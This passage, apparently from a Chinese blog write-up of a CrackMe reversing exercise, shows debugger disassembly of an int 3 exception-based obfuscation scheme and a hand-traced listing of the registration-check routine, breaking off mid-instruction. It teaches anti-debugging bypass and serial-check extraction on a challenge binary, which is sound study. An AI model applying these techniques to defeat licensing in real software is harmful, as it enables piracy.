class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;00401336    87ED            xchg ebp,ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040134A    8BDB            mov ebx,ebx                              ; CrackMe.004012F0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401354    8B4424 04       mov eax,dword ptr ss:[esp+0x4]//STRUCT _EXCEPTION_POINTERS *ExceptionInfo &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401442    8B08            mov ecx,dword ptr ds:[eax]//exp-&amp;gt;ExceptionRecord&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040139A    8139 03000080   cmp dword ptr ds:[ecx],0x80000003 //exp-&amp;gt;ExceptionRecord == int 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040144A  ^\0F85 14FFFFFF   jnz CrackMe.00401364&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//不是 int 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401391    33C0            xor eax,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040140D    C2 0400         retn 0x4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//是int 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040138A    56              push esi                                 ; kernel32.7C885780&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401471    8B70 04         mov esi,dword ptr ds:[eax+0x4]//exp-&amp;gt;ContextRecord; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040149F    8B96 B8000000   mov edx,dword ptr ds:[esi+0xB8]          ; CrackMe.0040164B&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014B8    803A CC         cmp byte ptr ds:[edx],0xCC&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004012F2   /0F85 D6000000   jnz CrackMe.004013CE &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//是int 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401329    42              inc edx                                  ; CrackMe.0040164B&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013B0    87ED            xchg ebp,ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013C4    8BDB            mov ebx,ebx                              ; CrackMe.004012F0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;jmp 004014A8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//不是int 3了，0xCC&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014A8    8A0A            mov cl,byte ptr ds:[edx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013F1    8AC1            mov al,cl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014D0    C0E0 06         shl al,0x6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401477    C0E9 02         shr cl,0x2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401495    02C1            add al,cl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040149A    34 0D           xor al,0xD&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014B0    8AC8            mov cl,al&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401430    C0E9 05         shr cl,0x5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014CA    C0E0 03         shl al,0x3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014D6    87ED            xchg ebp,ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014EA    8BDB            mov ebx,ebx                              ; CrackMe.004012F0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014F4    02C8            add cl,al&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004014C1    80C1 11         add cl,0x11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004012FF    8AC1            mov al,cl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013AA    C0E0 05         shl al,0x5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013DA    C0E9 03         shr cl,0x3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040146C    02C1            add al,cl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040141F    34 51           xor al,0x51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040147D    8AC8            mov cl,al&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013D4    C0E1 07         shl cl,0x7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013FF    D0E8            shr al,1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401367    87ED            xchg ebp,ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040137B    8BDB            mov ebx,ebx                              ; CrackMe.004012F0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401385    02C8            add cl,al&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401407    80E9 6F         sub cl,0x6F&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040145A    81E1 FF000000   and ecx,0xFF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401463    81E1 07000080   and ecx,0x80000007&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401424    03D1            add edx,ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401307    87ED            xchg ebp,ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040131B    8BDB            mov ebx,ebx                              ; CrackMe.004012F0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401325    42              inc edx                                  ; CrackMe.00401653&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013E7    83C8 FF         or eax,0xFFFFFFFF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401416    8996 B8000000   mov dword ptr ds:[esi+0xB8],edx          ; CrackMe.00401654&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//清楚混淆的代码，填充0x90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040136E    8BCA            mov ecx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401370    2BCF            sub ecx,edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401372    B0 90           mov al,0x90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401374    F3:AA           rep stos byte ptr es:[edi]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004013E7    83C8 FF         or eax,0xFFFFFFFF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040142C    5E              pop esi                                  ; kernel32.7C885780&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401439    C2 0400         retn 0x4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;本来这个是很妙的方法，但是无奈没成功，换一个思路&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Anonymous&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这个方法较麻烦，在 &lt;code&gt;00401416   mov dword ptr ds:[esi+0xB8],edx&lt;/code&gt; 处下条件断点，&lt;code&gt;byte ptr[edx] != 0xCC&lt;/code&gt;，每次断下之后，记录edx指向的代码（新的int 3之前），完整记录之后，就是注册验证的代码，手工记录如下（不会脚本啊）：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;96&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;98&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;99&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;102&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;104&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;105&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;106&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;107&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;108&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;109&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;110&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;111&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;112&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;113&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;114&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;115&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;116&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;117&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;118&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;119&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;120&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;121&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;122&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;123&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;124&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;125&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;126&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;127&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;128&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;129&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;130&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;131&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;132&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;133&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;134&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;135&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0040168D    6A 01           push 0x1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040168F    E8 30100000     call &amp;lt;jmp.&amp;amp;MFC42.#6334&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004016CE    BB E2D90100     mov ebx,0x1D9E2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401715    8D77 64         lea esi,dword ptr ds:[edi+0x64]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401718    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040171A    8BCE            mov ecx,esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040171C    E8 9D0F0000     call &amp;lt;jmp.&amp;amp;MFC42.#2915&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401721    8945 F8         mov dword ptr ss:[ebp-0x8],eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040175A    8B06            mov eax,dword ptr ds:[esi]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040175C    8B48 F8         mov ecx,dword ptr ds:[eax-0x8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040175F    894D FC         mov dword ptr ss:[ebp-0x4],ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017A1    8B36            mov esi,dword ptr ds:[esi]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017A3    68 0C414000     push CrackMe.0040410C&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017A8    56              push esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017A9    8B35 B4314000   mov esi,dword ptr ds:[&amp;lt;&amp;amp;MSVCRT._mbscmp&amp;gt;] ; msvcrt._mbscmp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017AF    FFD6            call esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017B1    83C4 08         add esp,0x8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017B4    85C0            test eax,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017B6    74 4C           je short CrackMe.00401804&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017F2    8B47 60         mov eax,dword ptr ds:[edi+0x60]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017F5    68 0C414000     push CrackMe.0040410C&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017FA    50              push eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017FB    FFD6            call esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004017FD    83C4 08         add esp,0x8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401800    85C0            test eax,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401802    75 17           jnz short CrackMe.0040181B&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401804    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401806    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401808    68 2C404000     push CrackMe.0040402C                    ; ASCII &amp;quot;注册失败！&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040180D    8BCF            mov ecx,edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040180F    E8 A40E0000     call &amp;lt;jmp.&amp;amp;MFC42.#4224&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401814    5F              pop edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401815    5E              pop esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401816    5B              pop ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401817    8BE5            mov esp,ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401819    5D              pop ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040181A    C3              retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004018ED    8B45 FC         mov eax,dword ptr ss:[ebp-0x4]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004018F0    8B55 F8         mov edx,dword ptr ss:[ebp-0x8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004018F3    83C9 FF         or ecx,0xFFFFFFFF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004018F6    8D7410 01       lea esi,dword ptr ds:[eax+edx+0x1]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004018FA    2BCA            sub ecx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004018FC    8BC6            mov eax,esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401947    0FBE50 FE       movsx edx,byte ptr ds:[eax-0x2]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040194B    48              dec eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040194C    03DA            add ebx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401994    8D149B          lea edx,dword ptr ds:[ebx+ebx*4]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401997    8D14D3          lea edx,dword ptr ds:[ebx+edx*8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040199A    8D1C52          lea ebx,dword ptr ds:[edx+edx*2]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004019E4    8818            mov byte ptr ds:[eax],bl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401A22    81F3 3A45AC14   xor ebx,0x14AC453A&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401A66    0018            add byte ptr ds:[eax],bl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401AA1    8D1401          lea edx,dword ptr ds:[ecx+eax]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401AA4    85D2            test edx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401AA6  ^ 0F8F 52FEFFFF   jg CrackMe.004018FE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401B42    8BC6            mov eax,esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401B96    0FBE50 FE       movsx edx,byte ptr ds:[eax-0x2]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401B9A    48              dec eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401B9B    03DA            add ebx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401BD6    8D149B          lea edx,dword ptr ds:[ebx+ebx*4]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401BD9    8D14D3          lea edx,dword ptr ds:[ebx+edx*8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401BDC    8D1C52          lea ebx,dword ptr ds:[edx+edx*2]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401C2F    8818            mov byte ptr ds:[eax],bl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401C6C    81E3 46A554A4   and ebx,0xA454A546&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401CAE    0018            add byte ptr ds:[eax],bl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401CF8    8D1408          lea edx,dword ptr ds:[eax+ecx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401CFB    85D2            test edx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401CFD  ^ 0F8F 41FEFFFF   jg CrackMe.00401B44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401D92    8BC6            mov eax,esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401DDC    0FBE50 FE       movsx edx,byte ptr ds:[eax-0x2]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401DE0    48              dec eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401DE1    03DA            add ebx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401E27    8D149B          lea edx,dword ptr ds:[ebx+ebx*4]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401E2A    8D14D3          lea edx,dword ptr ds:[ebx+edx*8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401E2D    8D1C52          lea ebx,dword ptr ds:[edx+edx*2]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401E75    8818            mov byte ptr ds:[eax],bl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401ECD    81CB 37214715   or ebx,0x15472137&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401F0A    0018            add byte ptr ds:[eax],bl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401F4E    8D1408          lea edx,dword ptr ds:[eax+ecx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401F51    85D2            test edx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401F53  ^ 0F8F 3BFEFFFF   jg CrackMe.00401D94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401F9E    8BC3            mov eax,ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FA0    33D2            xor edx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FA2    B9 1F011500     mov ecx,0x15011F&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FA7    F7F1            div ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FA9    8BDA            mov ebx,edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FF0    8D77 60         lea esi,dword ptr ds:[edi+0x60]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FF3    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FF5    8BCE            mov ecx,esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00401FF7    E8 C2060000     call &amp;lt;jmp.&amp;amp;MFC42.#2915&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402043    8B16            mov edx,dword ptr ds:[esi]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402045    8B52 F8         mov edx,dword ptr ds:[edx-0x8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004020D5    33C9            xor ecx,ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402111    83CE FF         or esi,0xFFFFFFFF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402114    8D5402 01       lea edx,dword ptr ds:[edx+eax+0x1]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402118    2BF0            sub esi,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004021A6    0FBE42 FE       movsx eax,byte ptr ds:[edx-0x2]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004021AA    4A              dec edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004021AB    8D0C89          lea ecx,dword ptr ds:[ecx+ecx*4]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004021AE    8D4C48 D0       lea ecx,dword ptr ds:[eax+ecx*2-0x30]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004021F9    880A            mov byte ptr ds:[edx],cl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402245    8D0432          lea eax,dword ptr ds:[edx+esi]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402248    85C0            test eax,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040224A  ^ 0F8F CAFEFFFF   jg CrackMe.0040211A&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402290    3BD9            cmp 